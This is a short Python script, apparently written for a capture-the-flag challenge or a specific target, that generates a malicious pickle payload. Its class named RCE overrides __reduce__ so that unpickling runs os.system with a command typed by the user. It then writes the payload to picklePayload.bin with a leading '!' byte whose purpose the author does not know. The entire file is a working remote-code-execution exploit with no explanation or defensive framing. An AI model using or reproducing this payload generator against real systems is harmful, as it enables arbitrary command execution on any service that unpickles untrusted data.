import pickle
import subprocess

cmd = input("What is your command? ")

class RCE:
	def __init__(self, c):
		self.cmd = c

	def __reduce__(self):
		import os
		return os.system, (cmd,)

rce = RCE(cmd)
payload = pickle.dumps(rce)

with open("picklePayload.bin", "wb") as pp:
	pp.write(b"!") # Required for some reason
	pp.write(payload)
